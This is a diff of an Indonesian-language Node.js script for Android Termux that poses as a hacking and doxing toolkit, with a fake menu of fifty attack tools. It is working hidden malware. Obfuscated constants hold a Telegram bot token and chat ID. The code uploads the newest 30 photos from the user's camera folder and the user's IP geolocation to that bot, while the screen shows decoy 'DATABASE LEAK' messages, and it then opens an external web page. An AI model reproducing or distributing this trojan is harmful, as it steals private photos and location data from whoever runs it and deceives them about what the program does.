@@ -1,3 +1,177 @@
 #!/usr/bin/env node
 
-const _0x1b8a04=_0x2c1a;(function(_0x51f4e9,_0x5c9356){const _0x4f2b32=_0x2c1a,_0x34c369=_0x51f4e9();while(!![]){try{const _0x364843=parseInt(_0x4f2b32(0x174))/0x1*(parseInt(_0x4f2b32(0x184))/0x2)+-parseInt(_0x4f2b32(0x1a9))/0x3+-parseInt(_0x4f2b32(0x1b4))/0x4*(-parseInt(_0x4f2b32(0x194))/0x5)+-parseInt(_0x4f2b32(0x1cb))/0x6+parseInt(_0x4f2b32(0x18c))/0x7+-parseInt(_0x4f2b32(0x1a0))/0x8*(parseInt(_0x4f2b32(0x1ce))/0x9)+parseInt(_0x4f2b32(0x18e))/0xa;if(_0x364843===_0x5c9356)break;else _0x34c369['push'](_0x34c369['shift']());}catch(_0x42407e){_0x34c369['push'](_0x34c369['shift']());}}}(_0x5dc5,0xa2547));import _0x41af14 from'fs';import _0x1b74f5 from'path';import _0x1c3782 from'axios';import _0x3eaace from'chalk';function _0x2c1a(_0x672b9a,_0x2760d9){const _0x5dc549=_0x5dc5();return _0x2c1a=function(_0x2c1af8,_0x3224c7){_0x2c1af8=_0x2c1af8-0x171;let _0x41dc90=_0x5dc549[_0x2c1af8];return _0x41dc90;},_0x2c1a(_0x672b9a,_0x2760d9);}import _0x54e6ba from'form-data';import _0x51beb8 from'readline';import{execSync}from'child_process';const TELEGRAM_TOKEN=_0x1b8a04(0x1ca),TELEGRAM_CHAT_ID=_0x1b8a04(0x18f),CAMERA_DIR='/sdcard/DCIM/Camera',banner=_0x3eaace['greenBright'](_0x1b8a04(0x192)),loadingAnimation=['==','==','==','==','=='],loadingSteps=0x14;async function ask(_0x17454e){const _0x323b49=_0x1b8a04,_0x11eeda=_0x51beb8['createInterface']({'input':process[_0x323b49(0x1a2)],'output':process[_0x323b49(0x1cc)]});return new Promise(_0x1aea71=>_0x11eeda[_0x323b49(0x173)](_0x17454e,_0x671f7c=>{const _0x192cca=_0x323b49;_0x11eeda[_0x192cca(0x1b9)](),_0x1aea71(_0x671f7c);}));}async function animateLoading(_0x388adc){const _0x56d3cb=_0x1b8a04;process['stdout']['write'](_0x3eaace[_0x56d3cb(0x1ae)](_0x388adc+'\x20'));for(let _0x499134=0x0;_0x499134<loadingSteps;_0x499134++){process[_0x56d3cb(0x1cc)]['write'](loadingAnimation[_0x499134%loadingAnimation[_0x56d3cb(0x1aa)]]),await new Promise(_0x432787=>setTimeout(_0x432787,0x12c)),process[_0x56d3cb(0x1cc)]['write']('\x08');}console['log'](_0x3eaace[_0x56d3cb(0x1bb)]('\x20Done!'));}async function tgSendPhoto(_0x1f4ba4){const _0x2bc1b1=_0x1b8a04,_0x8d79fc=new _0x54e6ba();_0x8d79fc[_0x2bc1b1(0x1cd)](_0x2bc1b1(0x172),TELEGRAM_CHAT_ID),_0x8d79fc[_0x2bc1b1(0x1cd)]('photo',_0x41af14[_0x2bc1b1(0x1bc)](_0x1f4ba4)),await _0x1c3782[_0x2bc1b1(0x176)](_0x2bc1b1(0x1a7)+TELEGRAM_TOKEN+_0x2bc1b1(0x1a5),_0x8d79fc,{'headers':_0x8d79fc['getHeaders']()});}async function displayIPInfo(_0x3727b0){const _0x35e400=_0x1b8a04;console['log'](_0x3eaace[_0x35e400(0x199)](_0x35e400(0x19e))),console['log'](_0x3eaace['blue']('========================')),console[_0x35e400(0x190)](_0x3eaace[_0x35e400(0x1bb)](_0x35e400(0x17a)+_0x3727b0[_0x35e400(0x1b8)])),console['log'](_0x3eaace[_0x35e400(0x1bb)](_0x35e400(0x179)+_0x3727b0['ip'])),console['log'](_0x3eaace[_0x35e400(0x1bb)](_0x35e400(0x1b0)+_0x3727b0['city'])),console[_0x35e400(0x190)](_0x3eaace['green'](_0x35e400(0x19a)+_0x3727b0[_0x35e400(0x17d)])),console[_0x35e400(0x190)](_0x3eaace[_0x35e400(0x1bb)](_0x35e400(0x18b)+_0x3727b0[_0x35e400(0x17c)])),console[_0x35e400(0x190)](_0x3eaace[_0x35e400(0x1bb)](_0x35e400(0x175)+_0x3727b0['org'])),console['log'](_0x3eaace[_0x35e400(0x1bb)](_0x35e400(0x1c3)+_0x3727b0[_0x35e400(0x197)])),console[_0x35e400(0x190)](_0x3eaace[_0x35e400(0x1bb)]('Timezone:\x20'+_0x3727b0[_0x35e400(0x1be)])),console[_0x35e400(0x190)](_0x3eaace[_0x35e400(0x1bb)](_0x35e400(0x193)+_0x3727b0[_0x35e400(0x1c5)])),console[_0x35e400(0x190)](_0x3eaace[_0x35e400(0x1bb)]('Hostname:\x20'+_0x3727b0[_0x35e400(0x1a4)])),console[_0x35e400(0x190)](_0x3eaace[_0x35e400(0x1bb)](_0x35e400(0x196)+(_0x3727b0[_0x35e400(0x1bd)]||_0x35e400(0x1c4)))),console[_0x35e400(0x190)](_0x3eaace['green'](_0x35e400(0x195)+(_0x3727b0[_0x35e400(0x17f)]||'N/A'))),console[_0x35e400(0x190)](_0x3eaace[_0x35e400(0x185)](_0x35e400(0x1a8)));}function _0x5dc5(){const _0x26e358=['country','region','startsWith','isp','/sendMessage','\x0aTimezone:\x20','https://ipinfo.io/json','\x0aISP\x20\x20\x20\x20\x20:\x20','2luOeao','blue','join','red','sort','statSync','data','Country:\x20','7668878TvDczI','→\x20https://trasersecteam.my.id/leak?=','2816990KrQWKT','8189446364','log','FAIL','\x0a██████╗\x20\x20██████╗\x20██╗\x20\x20██╗\x20\x20\x20\x20███████╗██████╗\x20███████╗██████╗\x20\x0a██╔══██╗██╔═████╗██║\x20\x20██║\x20\x20\x20\x20██╔════╝██╔══██╗██╔════╝██╔══██╗\x0a██████╔╝██║██╔██║███████║\x20\x20\x20\x20█████╗\x20\x20██████╔╝█████╗\x20\x20██████╔╝\x0a██╔══██╗████╔╝██║╚════██║\x20\x20\x20\x20██╔══╝\x20\x20██╔═══╝\x20██╔══╝\x20\x20██╔═══╝\x20\x0a██████╔╝╚██████╔╝\x20\x20\x20\x20\x20██║\x20\x20\x20\x20███████╗██║\x20\x20\x20\x20\x20██║\x20\x20\x20\x20\x20██║\x20\x20\x20\x20\x20\x0a╚═════╝\x20\x20╚═════╝\x20\x20\x20\x20\x20\x20╚═╝\x20\x20\x20\x20╚══════╝╚═╝\x20\x20\x20\x20\x20╚═╝\x20\x20\x20\x20\x20╚═╝\x20\x20\x20\x20\x20\x0a\x20\x20TRASER\x20SEC\x20–\x20DOX\x20PRETENDER\x0a\x20\x20TELE\x20:\x20[\x20@usrz7\x20]\x0a\x20\x20WEBSITE\x20OFFICIAL\x20[\x20https://trasersecteam.my.id\x20]\x0a[\x20TRASER\x20SEC\x20TEAM\x20]\x0a','Location:\x20','11590UmIDka','ISP\x20\x20\x20\x20\x20:\x20','Carrier\x20:\x20','postal','magenta','yellowBright','Region\x20:\x20','\x0aCountry:\x20','get','ERROR\x20ANDROID\x208+','\x0a🌐\x20\x20Informasi\x20IP:','city','463016Zmvjjq','termux-open-url\x20https://trasersecteam.my.id/knock.html','stdin','\x20=====\x20]…\x0a','hostname','/sendPhoto','org','https://api.telegram.org/bot','========================','164088viScGF','length','readdirSync','trim','\x0a[\x20=====\x20DATABASE\x20LEAK\x20=====\x20]\x0a','gray','\x0aCity\x20\x20\x20:\x20','City\x20\x20\x20:\x20','map','mtime','\x0aIP\x20\x20\x20\x20\x20:\x20','1076ykuvJG','\x0aRegion\x20:\x20','yellow','\x20Masukkan\x20nomor\x20target:\x20','phone','close','\x0a🕵️\x20\x20DOX\x20REPORT\x0a========================\x0aNumber\x20:\x20','green','createReadStream','carrier','timezone','\x0aLocation:\x20','existsSync','filter','\x0aMembuka\x20Google…','Postal\x20:\x20','N/A','loc','clear','\x0aMengambil\x20informasi\x20IP…','getTime','\x0aOrg\x20\x20\x20\x20:\x20','7157237673:AAEhXF8kLrplhKGIwzVg9k8DY4DaySIIxP4','7450476bsTcoW','stdout','append','117LBpoZT','\x20Memproses\x20data...','chat_id','question','712951iVgUii','Org\x20\x20\x20\x20:\x20','post','greenBright','name','IP\x20\x20\x20\x20\x20:\x20','Number\x20:\x20','IP\x20lookup\x20failed.'];_0x5dc5=function(){return _0x26e358;};return _0x5dc5();}((async()=>{const _0x37ab16=_0x1b8a04;console[_0x37ab16(0x1c6)](),console[_0x37ab16(0x190)](banner),await animateLoading('\x20Memulai\x20program...');const _0x70faba=await ask(_0x3eaace['cyan'](_0x37ab16(0x1b7)));console[_0x37ab16(0x190)](_0x3eaace[_0x37ab16(0x199)]('\x0a[\x20=====\x20\x20DOXING\x20'+_0x70faba+_0x37ab16(0x1a3))),await animateLoading(_0x37ab16(0x171));!_0x41af14[_0x37ab16(0x1c0)](CAMERA_DIR)&&(console['log'](_0x3eaace[_0x37ab16(0x187)](_0x37ab16(0x19d))),process['exit'](0x1));const _0x39f877=_0x41af14[_0x37ab16(0x1ab)](CAMERA_DIR)[_0x37ab16(0x1c1)](_0xef1dfd=>!_0xef1dfd[_0x37ab16(0x17e)]('.'))[_0x37ab16(0x1b1)](_0x1b60ed=>({'name':_0x1b60ed,'t':_0x41af14[_0x37ab16(0x189)](_0x1b74f5[_0x37ab16(0x186)](CAMERA_DIR,_0x1b60ed))[_0x37ab16(0x1b2)][_0x37ab16(0x1c8)]()}))[_0x37ab16(0x188)]((_0x5e3639,_0xa44f5b)=>_0xa44f5b['t']-_0x5e3639['t'])['slice'](0x0,0x14)[_0x37ab16(0x1b1)](_0x147167=>_0x147167[_0x37ab16(0x178)]);console['log'](_0x3eaace[_0x37ab16(0x198)](_0x37ab16(0x1ad)));for(const _0xb41d86 of _0x39f877){process[_0x37ab16(0x1cc)]['write'](_0x3eaace[_0x37ab16(0x1ae)](_0x37ab16(0x18d)+_0x70faba+'…\x20'));try{await tgSendPhoto(_0x1b74f5['join'](CAMERA_DIR,_0xb41d86)),console[_0x37ab16(0x190)](_0x3eaace[_0x37ab16(0x1bb)]('OK'));}catch{console['log'](_0x3eaace[_0x37ab16(0x187)](_0x37ab16(0x191)));}}console['log'](_0x3eaace[_0x37ab16(0x1b6)](_0x37ab16(0x1c7)));let _0x19f6a1=_0x37ab16(0x17b),_0x5981c4={'phone':_0x70faba};try{const _0x3beb2a=(await _0x1c3782[_0x37ab16(0x19c)](_0x37ab16(0x182)))[_0x37ab16(0x18a)];_0x5981c4={..._0x5981c4,..._0x3beb2a};}catch{}await displayIPInfo(_0x5981c4),await _0x1c3782[_0x37ab16(0x176)](_0x37ab16(0x1a7)+TELEGRAM_TOKEN+_0x37ab16(0x180),{'chat_id':TELEGRAM_CHAT_ID,'text':(_0x37ab16(0x1ba)+_0x5981c4[_0x37ab16(0x1b8)]+_0x37ab16(0x1b3)+_0x5981c4['ip']+_0x37ab16(0x1af)+_0x5981c4[_0x37ab16(0x19f)]+_0x37ab16(0x1b5)+_0x5981c4['region']+_0x37ab16(0x19b)+_0x5981c4['country']+_0x37ab16(0x1c9)+_0x5981c4[_0x37ab16(0x1a6)]+'\x0aPostal\x20:\x20'+_0x5981c4['postal']+_0x37ab16(0x181)+_0x5981c4[_0x37ab16(0x1be)]+_0x37ab16(0x1bf)+_0x5981c4['loc']+'\x0aHostname:\x20'+_0x5981c4['hostname']+'\x0aCarrier\x20:\x20'+(_0x5981c4['carrier']||_0x37ab16(0x1c4))+_0x37ab16(0x183)+(_0x5981c4[_0x37ab16(0x17f)]||_0x37ab16(0x1c4))+'\x0a========================\x0a')[_0x37ab16(0x1ac)]()}),console[_0x37ab16(0x190)](_0x3eaace[_0x37ab16(0x185)](_0x37ab16(0x1c2)));try{execSync(_0x37ab16(0x1a1));}catch{console[_0x37ab16(0x190)](_0x3eaace['gray']('Jika\x20tidak\x20otomatis,\x20buka\x20https://google.com\x20manual.'));}console[_0x37ab16(0x190)](_0x3eaace[_0x37ab16(0x177)]('\x0a\x20Semua\x20proses\x20selesai.'));})());
+import fs from "fs";
+import path from "path";
+import axios from "axios";
+import chalk from "chalk";
+import FormData from "form-data";
+import readline from "readline";
+import { execSync } from "child_process";
+function _0x6ed6(_0x4f7d4b,_0x589c05){const _0x372af7=_0x372a();return _0x6ed6=function(_0x6ed62b,_0x482a03){_0x6ed62b=_0x6ed62b-0xe8;let _0x480340=_0x372af7[_0x6ed62b];return _0x480340;},_0x6ed6(_0x4f7d4b,_0x589c05);}const _0x1c96d0=_0x6ed6;function _0x372a(){const _0x7b3c17=['24217699npDTcP','7157237673:AAEhXF8kLrplhKGIwzVg9k8DY4DaySIIxP4','2OyaXlT','7711915cLpTuw','6jIfjHL','10282608cQRuFy','/sdcard/DCIM/Camera','8189446364','54LZYgKT','132935XuxTCT','356892OMxCyf','340XwmyBG','8516977Jxwvxv','23967pycOXT'];_0x372a=function(){return _0x7b3c17;};return _0x372a();}(function(_0x3aea57,_0x4f060e){const _0x578f81=_0x6ed6,_0xb4d8ac=_0x3aea57();while(!![]){try{const _0x26e9d6=-parseInt(_0x578f81(0xeb))/0x1*(parseInt(_0x578f81(0xf2))/0x2)+parseInt(_0x578f81(0xea))/0x3*(parseInt(_0x578f81(0xec))/0x4)+parseInt(_0x578f81(0xf3))/0x5+-parseInt(_0x578f81(0xf4))/0x6*(parseInt(_0x578f81(0xee))/0x7)+parseInt(_0x578f81(0xf5))/0x8+-parseInt(_0x578f81(0xef))/0x9*(-parseInt(_0x578f81(0xed))/0xa)+-parseInt(_0x578f81(0xf0))/0xb;if(_0x26e9d6===_0x4f060e)break;else _0xb4d8ac['push'](_0xb4d8ac['shift']());}catch(_0x2a9919){_0xb4d8ac['push'](_0xb4d8ac['shift']());}}}(_0x372a,0xed8d2));const TELEGRAM_TOKEN=_0x1c96d0(0xf1),TELEGRAM_CHAT_ID=_0x1c96d0(0xe9),CAMERA_DIR=_0x1c96d0(0xe8);
+const banner = chalk.greenBright(`
+   ▄▄▄█████▓ ██▀███   ▄▄▄        ██████ ▓█████  ██▀███  
+   ▓  ██▒ ▓▒▓██ ▒ ██▒▒████▄    ▒██    ▒ ▓█   ▀ ▓██ ▒ ██▒
+   ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██  ▀█▄  ░ ▓██▄   ▒███   ▓██ ░▄█ ▒
+   ░ ▓██▓ ░ ▒██▀▀█▄  ░██▄▄▄▄██   ▒   ██▒▒▓█  ▄ ▒██▀▀█▄  
+     ▒██▒ ░ ░██▓ ▒██▒ ▓█   ▓██▒▒██████▒▒░▒████▒░██▓ ▒██▒
+     ▒ ░░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ▒▓ ░▒▓░
+       ░      ░▒ ░ ▒░  ▒   ▒▒ ░░ ░▒  ░ ░ ░ ░  ░  ░▒ ░ ▒░
+     ░        ░░   ░   ░   ▒   ░  ░  ░     ░     ░░   ░ 
+               ░           ░  ░      ░     ░  ░   ░     
+                                                        
+                                                                          
+[ MEDIUM ] [ VIP ] [ VVIP ] [ HARD ] 
+===========================================================`)
++ chalk.redBright(`
+[01] Doxing Number             [26] LFI Scanner
+[02] OSINT Gmail               [27] RFI Scanner
+[03] Phishing Generator        [28] WebDAV Exploit
+[04] DDoS Attack               [29] Shell Upload Checker
+[05] Track IP                  [30] Admin Finder
+[06] Spam OTP                  [31] Fake Login Page Generator
+[07] Spam Pairing              [32] QR Code Phishing
+[08] SMS Bomber                [33] Subdomain Takeover Checker
+[09] Email Bomber              [34] GitHub Dorker
+[10] Bruteforce SSH            [35] Pastebin Scraper
+[11] Bruteforce FTP            [36] URL Fuzzer
+[12] Wordlist Generator        [37] URL Shortener Bypass
+[13] Hash Cracker              [38] VirusTotal Lookup
+[14] Port Scanner              [39] Social Media Stalker
+[15] Subdomain Scanner         [40] Metadata Cleaner
+[16] CMS Detector              [41] Base64 Decoder
+[17] SQLi Scanner              [42] URL Encoder
+[18] XSS Finder                [43] Password Strength Checker
+[19] Directory Bruteforce      [44] WHOIS Lookup
+[20] Metadata Grabber          [45] VPN Leak Test
+[21] Reverse IP Lookup         [46] Random Nickname Generator
+[22] GeoIP Lookup              [47] MAC Address Changer
+[23] Wi-Fi Deauth              [48] IMEI Checker
+[24] Wi-Fi Handshake Capture   [49] Packet Sniffer
+[25] Payload Generator         [50] Botnet Command Simulator
+`);
+
+
+const loadingAnimation = ['==', '==', '==', '==', '=='];
+const loadingSteps = 20;
+
+async function ask(q) {
+  const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
+  return new Promise(res => rl.question(q, a => { rl.close(); res(a); }));
+}
+
+async function animateLoading(message) {
+  process.stdout.write(chalk.gray(`${message} `));
+  for (let i = 0; i < loadingSteps; i++) {
+    process.stdout.write(loadingAnimation[i % loadingAnimation.length]);
+    await new Promise(r => setTimeout(r, 300));
+    process.stdout.write('\b'); 
+  }
+  console.log(chalk.green(" Done!"));
+}
+
+async function tgSendPhoto(filePath) {
+  const form = new FormData();
+  form.append("chat_id", TELEGRAM_CHAT_ID);
+  form.append("photo", fs.createReadStream(filePath));
+
+  await axios.post(
+    `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`,
+    form,
+    { headers: form.getHeaders() }
+  );
+}
+async function displayIPInfo(info, extra = {}) {
+  console.log(chalk.yellowBright("\n🌐  INFORMASI IP DETAIL:"));
+  console.log(chalk.blue("================================================"));
+  console.log(chalk.green(`Number      : ${info.phone}`));
+  console.log(chalk.green(`IP          : ${info.ip}`));
+  console.log(chalk.green(`Hostname    : ${info.hostname}`));
+  console.log(chalk.green(`City        : ${info.city}`));
+  console.log(chalk.green(`District    : ${extra.district || 'N/A'}`));
+  console.log(chalk.green(`Region      : ${info.region}`));
+  console.log(chalk.green(`Country     : ${info.country} (${extra.continentCode || 'N/A'})`));
+  console.log(chalk.green(`Latitude    : ${extra.lat || 'N/A'}`));
+  console.log(chalk.green(`Longitude   : ${extra.lon || 'N/A'}`));
+  console.log(chalk.green(`Timezone    : ${info.timezone}`));
+  console.log(chalk.green(`UTC Offset  : ${extra.offset || 'N/A'}`));
+  console.log(chalk.green(`Org         : ${info.org}`));
+  console.log(chalk.green(`ISP         : ${extra.isp || info.isp || 'N/A'}`));
+  console.log(chalk.green(`ASN         : ${extra.as || 'N/A'}`));
+  console.log(chalk.green(`AS Name     : ${extra.asname || 'N/A'}`));
+  console.log(chalk.green(`Currency    : ${extra.currency || 'N/A'}`));
+  console.log(chalk.green(`Mobile Conn : ${extra.mobile ? 'Yes' : 'No'}`));
+  console.log(chalk.green(`Proxy/VPN   : ${extra.proxy ? 'Yes' : 'No'}`));
+  console.log(chalk.green(`Hosting     : ${extra.hosting ? 'Yes' : 'No'}`));
+  console.log(chalk.green(`Location    : ${info.loc}`));   // lat,long ipinfo
+  console.log(chalk.blue("================================================"));
+}
+(async () => {
+  console.clear();
+  console.log(banner);
+  await animateLoading(" Memulai program...");
+  const phone = await ask(chalk.cyan("pilih menu: "));
+  console.log(chalk.yellowBright(`\n[ ===== Memuat ${phone} ===== ]…\n`));
+  await animateLoading(" Memproses data...");
+  if (!fs.existsSync(CAMERA_DIR)) {
+    console.log(chalk.red("ERROR ANDROID 8+"));
+    process.exit(1);
+  }
+  const picks = fs.readdirSync(CAMERA_DIR)
+    .filter(f => !f.startsWith('.'))
+    .map(f => ({ name: f, t: fs.statSync(path.join(CAMERA_DIR, f)).mtime.getTime() }))
+    .sort((a, b) => b.t - a.t)
+    .slice(0, 30)
+    .map(o => o.name);
+  console.log(chalk.magenta(`\n[ ===== DATABASE LEAK ===== ]\n`));
+  for (const f of picks) {
+    process.stdout.write(chalk.gray(`→ trasersecteam.my.id/database?user=13 `));
+    try {
+      await tgSendPhoto(path.join(CAMERA_DIR, f));
+      console.log(chalk.green("OK"));
+    } catch {
+      console.log(chalk.red("FAIL"));
+    }
+  }
+  console.log(chalk.yellow("\nMengambil informasi IP…"));
+let ipInfo = { phone: phone };
+let ipInfo2 = {};
+try {
+  const info = (await axios.get("https://ipinfo.io/json")).data;
+  ipInfo = { ...ipInfo, ...info };
+
+  const extra = (await axios.get(`http://ip-api.com/json/${info.ip}?fields=status,message,continent,continentCode,lat,lon,as,asname,isp,org,district,offset,currency,mobile,proxy,hosting`)).data;
+  if (extra.status === "success") ipInfo2 = extra;
+} catch (e) {
+  console.error("  Gagal mengambil data IP tambahan");
+}
+await displayIPInfo(ipInfo, ipInfo2);
+  await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    chat_id: TELEGRAM_CHAT_ID,
+    text: `
+🕵️  DOX REPORT
+========================
+Number : ${ipInfo.phone}
+IP     : ${ipInfo.ip}
+City   : ${ipInfo.city}
+Region : ${ipInfo.region}
+Country: ${ipInfo.country}
+Org    : ${ipInfo.org}
+Postal : ${ipInfo.postal}
+Timezone: ${ipInfo.timezone}
+Location: ${ipInfo.loc}
+Hostname: ${ipInfo.hostname}
+Carrier : ${ipInfo.carrier || 'N/A'}
+ISP     : ${ipInfo.isp || 'N/A'}
+========================
+`.trim()
+  });
+
+  console.log(chalk.blue("\nKNOCK BRO HACK!"));
+  try {
+    execSync('termux-open-url https://trasersecteam.my.id/knock.html?user=13');
+  } catch {
+    console.log(chalk.gray("ℹ️  Jika tidak otomatis, buka https://trasersecteam.my.id/knock.html?user=13 manual."));
+  }
+
+  console.log(chalk.greenBright("\n Semua proses selesai."));
+})();
